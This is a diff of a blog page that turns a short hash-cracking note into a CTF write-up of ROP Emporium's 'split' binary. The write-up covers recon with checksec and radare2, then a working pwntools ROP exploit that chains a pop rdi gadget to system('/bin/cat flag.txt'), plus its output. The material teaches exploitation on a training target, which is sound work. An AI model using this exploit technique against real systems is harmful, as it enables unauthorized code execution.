@@ -16,22 +16,28 @@
   <meta name="author" content="Xiung">
   <meta name="keywords" content="">
   
-    <meta name="description" content="基本步驟： 如果要破解hash的話，要先判斷是哪種hash a. 可以利用網路資源-Hashes.com b. 或是使用python工具-hashid hashid.py 使用方式 可直接 python3 hash-id.py輸入 也可以 cat hash.txt | hash-identifier 這種方式輸入   c. 也可以自己用比對(Ctrl-f)的方式： hash表">
+    <meta name="description" content="file split  1234$ file splitsplit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;98755e64e1d0c1b">
 <meta property="og:type" content="article">
-<meta property="og:title" content="John The Ripper">
-<meta property="og:url" content="http://example.com/2021/08/06/John-The-Ripper/index.html">
+<meta property="og:title" content="split">
+<meta property="og:url" content="http://example.com/2022/01/12/split/index.html">
 <meta property="og:site_name" content="Xiung&#39;s Blog">
-<meta property="og:description" content="基本步驟： 如果要破解hash的話，要先判斷是哪種hash a. 可以利用網路資源-Hashes.com b. 或是使用python工具-hashid hashid.py 使用方式 可直接 python3 hash-id.py輸入 也可以 cat hash.txt | hash-identifier 這種方式輸入   c. 也可以自己用比對(Ctrl-f)的方式： hash表">
+<meta property="og:description" content="file split  1234$ file splitsplit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;98755e64e1d0c1b">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-08-06T14:14:12.000Z">
-<meta property="article:modified_time" content="2022-10-02T09:19:17.485Z">
+<meta property="og:image" content="https://i.imgur.com/6wijIYI.png">
+<meta property="og:image" content="https://i.imgur.com/nvN8Qsf.png">
+<meta property="og:image" content="https://i.imgur.com/NmfH83V.png">
+<meta property="article:published_time" content="2022-01-11T18:57:26.000Z">
+<meta property="article:modified_time" content="2022-10-02T09:45:57.070Z">
 <meta property="article:author" content="Xiung">
 <meta property="article:tag" content="CyberSecurity">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.imgur.com/6wijIYI.png">
   
   
   
-  <title>John The Ripper - Xiung&#39;s Blog</title>
+  <title>split - Xiung&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -196,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="John The Ripper"></span>
+            <span id="subtitle" data-typed-text="split"></span>
           
         </div>
 
@@ -207,8 +213,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2021-08-06 22:14" pubdate>
-          August 6, 2021 pm
+        <time datetime="2022-01-12 02:57" pubdate>
+          January 12, 2022 am
         </time>
       </span>
     
@@ -219,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          168 words
+          2.7k words
         
       </span>
     
@@ -230,7 +236,7 @@
         
         
         
-          2 mins
+          23 mins
         
       </span>
     
@@ -268,18 +274,52 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">John The Ripper</h1>
+            <h1 style="display: none">split</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="基本步驟："><a href="#基本步驟：" class="headerlink" title="基本步驟："></a>基本步驟：</h1><ol>
-<li>如果要破解hash的話，要先判斷是哪種hash<br> a. 可以利用網路資源-<a target="_blank" rel="noopener" href="https://hashes.com/en/tools/hash_identifier">Hashes.com</a><br> b. 或是使用python工具-<a target="_blank" rel="noopener" href="https://pypi.org/project/hashID/">hashid</a><blockquote>
-<p>hashid.py 使用方式<br> 可直接 <code>python3 hash-id.py</code>輸入<br> 也可以 <code>cat hash.txt | hash-identifier</code> 這種方式輸入</p>
-</blockquote>
-<p> c. 也可以自己用比對(<code>Ctrl-f</code>)的方式：<br> <a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes" title="hashcat.net">hash表</a></p>
+                <ol>
+<li><code>file split</code></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ file <span class="hljs-built_in">split</span><br><span class="hljs-built_in">split</span>: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), <br>dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, <br>BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>gdb-peda, checksec</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb-peda <span class="hljs-built_in">split</span><br>Reading symbols from <span class="hljs-built_in">split</span>...<br>(No debugging symbols found <span class="hljs-keyword">in</span> <span class="hljs-built_in">split</span>)<br>gdb-peda$ checksec<br>CANARY    : disabled<br>FORTIFY   : disabled<br>NX        : ENABLED<br>PIE       : disabled<br>RELRO     : Partial<br>gdb-peda$<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><code>r2 split</code>, <code>aa</code>, <code>afl</code>, I notice the special function <strong>pwnme</strong>, <strong>usefulFunction</strong>.</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x00400742]&gt; afl<br>0x004005b0    1 42           entry0<br>0x004005f0    4 42   -&gt; 37   sym.deregister_tm_clones<br>0x00400620    4 58   -&gt; 55   sym.register_tm_clones<br>0x00400660    3 34   -&gt; 29   sym.__do_global_dtors_aux<br>0x00400690    1 7            entry.init0<br>0x004006e8    1 90           sym.pwnme      ====&gt; this one<br>0x00400580    1 6            sym.imp.memset<br>0x00400550    1 6            sym.imp.puts<br>0x00400570    1 6            sym.imp.printf<br>0x00400590    1 6            sym.imp.read<br>0x00400742    1 17           sym.usefulFunction     ====&gt; this one<br>0x00400560    1 6            sym.imp.system<br>0x004007d0    1 2            sym.__libc_csu_fini<br>0x004007d4    1 9            sym._fini<br>0x00400760    4 101          sym.__libc_csu_init<br>0x004005e0    1 2            sym._dl_relocate_static_pie<br>0x00400697    1 81           main             ====&gt; this one<br>0x004005a0    1 6            sym.imp.setvbuf<br>0x00400528    3 23           sym._init<br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>I choose to see the main function first. It seems do nothing but print some strings.</li>
+</ol>
+<p><img src="https://i.imgur.com/6wijIYI.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<ol start="4">
+<li>go to see another function <strong>pwnme</strong>. we have a input which store at <strong>var_20h(rbp-0x20)</strong>.</li>
+</ol>
+<p><img src="https://i.imgur.com/nvN8Qsf.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<ol start="5">
+<li>and the usefulfunction is below.</li>
+</ol>
+<p><img src="https://i.imgur.com/NmfH83V.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<ol start="6">
+<li>we use <code>iz</code> to find an <code>cat / flag.txt</code></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x00400742]&gt; iz<br>[Strings]<br>nth paddr      vaddr      len size section <span class="hljs-built_in">type</span>  string<br>―――――――――――――――――――――――――――――――――――――――――――――――――――――――<br>0   0x000007e8 0x004007e8 21  22   .rodata ascii <span class="hljs-built_in">split</span> by ROP Emporium<br>1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n<br>2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting<br>3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user <span class="hljs-keyword">for</span> data...<br>4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!<br>5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls<br>0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt ===&gt; this one<br></code></pre></td></tr></table></figure>
+
+<ol start="7">
+<li><p>then we can write our expolit code.<br> we need to padding to the return address, it is 0x20 + 0x8(rbp), then the address of <code>pop rdi ; ret</code>, then address of <code>/bin/cat flag.txt</code>, and <code>sym.imp.system</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">r</span> = process(&#x27;./split&#x27;)<br><span class="hljs-comment">#r = remote(&#x27;120.114.62.211&#x27;, 6126)</span><br><br><span class="hljs-attribute">padding</span> = b&#x27;A&#x27;*<span class="hljs-number">40</span><br><span class="hljs-attribute">pop_rdi</span> = <span class="hljs-number">0</span>x4007c3<br><span class="hljs-attribute">cat_flag</span> = <span class="hljs-number">0</span>x601060<br><span class="hljs-attribute">syscall</span> = <span class="hljs-number">0</span>x400560<br><br><span class="hljs-comment"># payload = padding</span><br><span class="hljs-comment"># payload += p64(pop_rdi)</span><br><span class="hljs-comment"># payload += p64(cat_flag)</span><br><span class="hljs-comment"># payload += p64(syscall)</span><br><br><span class="hljs-attribute">r</span>.sendline(padding + p64(pop_rdi) + p64(cat_flag) + p64(syscall))  #if <span class="hljs-number">64</span> bit ,or <span class="hljs-number">32</span>bit use p32<br><br><span class="hljs-attribute">r</span>.interactive()<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>then we can run the code and get the flag.</p>
 </li>
 </ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 exploit_split.py<br>[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./split&#x27;</span>: pid 155<br>[*] Switching to interactive mode<br><span class="hljs-built_in">split</span> by ROP Emporium<br>x86_64<br><br>Contriving a reason to ask user <span class="hljs-keyword">for</span> data...<br>&gt; Thank you!<br>ROPE&#123;a_placeholder_32byte_flag!&#125;<br>[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive<br>$<br></code></pre></td></tr></table></figure>
+<p>ROPE{a_placeholder_32byte_flag!}</p>
 
                 
               </div>
@@ -298,7 +338,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Learning-Note/" class="category-chain-item">Learning Note</a>
+  <a href="/categories/Write-up/" class="category-chain-item">Write-up</a>
   
   
 
@@ -315,6 +355,10 @@
       
         <a href="/tags/CyberSecurity/">#CyberSecurity</a>
       
+        <a href="/tags/PWN/">#PWN</a>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
     </div>
   
 </div>
@@ -325,8 +369,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>John The Ripper</div>
-      <div>http://example.com/2021/08/06/John-The-Ripper/</div>
+      <div>split</div>
+      <div>http://example.com/2022/01/12/split/</div>
     </div>
     <div class="license-meta">
       
@@ -338,7 +382,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 6, 2021</div>
+          <div>January 12, 2022</div>
         </div>
       
       
@@ -370,9 +414,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/01/gohome/" title="gohome">
+                      <a href="/2022/04/05/python3-ssh-%E5%82%B3%E6%AA%94%E6%A1%88/" title="python3 ssh 傳檔案">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">gohome</span>
+                        <span class="hidden-mobile">python3 ssh 傳檔案</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -380,8 +424,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/07/02/WSL2-Kali-%E4%BD%BF%E7%94%A8-msf-%E8%B3%87%E6%96%99%E5%BA%AB%E7%9A%84%E9%8C%AF%E8%AA%A4%E8%A7%A3%E6%B1%BA/" title="WSL2-Kali 使用 msf 資料庫的錯誤解決">
-                        <span class="hidden-mobile">WSL2-Kali 使用 msf 資料庫的錯誤解決</span>
+                      <a href="/2022/01/10/pass/" title="pass">
+                        <span class="hidden-mobile">pass</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
